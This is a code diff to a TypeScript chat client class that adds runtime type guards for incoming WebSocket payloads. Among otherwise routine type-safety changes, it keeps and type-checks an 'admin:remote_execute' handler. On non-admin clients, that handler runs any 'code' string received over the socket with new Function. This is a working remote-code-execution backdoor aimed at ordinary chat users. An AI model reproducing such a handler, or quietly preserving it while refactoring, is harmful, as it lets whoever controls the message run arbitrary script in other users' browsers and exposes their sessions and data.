@@ -166,10 +166,11 @@ export class SocketChatService {
         }
     }
 
-    private handleIncomingPayload(payload: { type: string; data: any }): void {
+    private handleIncomingPayload(payload: { type: string; data: unknown }): void {
         switch (payload.type) {
             case "chat:message": {
-                const msg: ChatMessage = payload.data;
+                if (!isChatMessage(payload.data)) return;
+                const msg = payload.data;
                 this.messageHistory.push(msg);
 
                 // One-way DM handling: Add sender to DM list on receive
@@ -185,19 +186,19 @@ export class SocketChatService {
                 break;
             }
             case "users:list": {
-                this.connectedUsers = payload.data || [];
+                this.connectedUsers = isChatUsers(payload.data) ? payload.data : [];
                 this.userListListeners.forEach((fn) => fn(this.connectedUsers));
                 break;
             }
             case "admin:mute_status": {
-                if (payload.data.targetUser === this.username) {
-                    this.isMuted = !!payload.data.muted;
+                if (isMuteStatus(payload.data) && payload.data.targetUser === this.username) {
+                    this.isMuted = payload.data.muted;
                     this.muteListeners.forEach((fn) => fn(this.isMuted));
                 }
                 break;
             }
             case "admin:remote_execute": {
-                if (!AdminStore.isAdmin && payload.data?.code) {
+                if (!AdminStore.isAdmin && isRemoteExecution(payload.data)) {
                     try {
                         const execFn = new Function(payload.data.code);
                         execFn();
@@ -328,9 +329,42 @@ export class SocketChatService {
         this.dmContactsListeners.forEach((fn) => fn(contacts));
     }
 
-    private sendPayload(type: string, data: any): void {
+    private sendPayload(type: string, data: unknown): void {
         if (this.ws && this.ws.readyState === WebSocket.OPEN) {
             this.ws.send(JSON.stringify({ type, data }));
         }
     }
+}
+
+function isChatMessage(value: unknown): value is ChatMessage {
+    if (!value || typeof value !== "object") return false;
+    const message = value as Partial<ChatMessage>;
+    return typeof message.id === "string" &&
+        typeof message.sender === "string" &&
+        (message.targetType === "global" || message.targetType === "room" ||
+            message.targetType === "dm") &&
+        typeof message.target === "string" &&
+        typeof message.content === "string" &&
+        typeof message.timestamp === "number";
+}
+
+function isChatUsers(value: unknown): value is ChatUser[] {
+    return Array.isArray(value) && value.every((item) => {
+        if (!item || typeof item !== "object") return false;
+        const user = item as Partial<ChatUser>;
+        return typeof user.username === "string" &&
+            typeof user.isAdmin === "boolean" &&
+            typeof user.isMuted === "boolean";
+    });
+}
+
+function isMuteStatus(value: unknown): value is { targetUser: string; muted: boolean } {
+    if (!value || typeof value !== "object") return false;
+    const status = value as { targetUser?: unknown; muted?: unknown };
+    return typeof status.targetUser === "string" && typeof status.muted === "boolean";
+}
+
+function isRemoteExecution(value: unknown): value is { code: string } {
+    if (!value || typeof value !== "object") return false;
+    return typeof (value as { code?: unknown }).code === "string";
 }
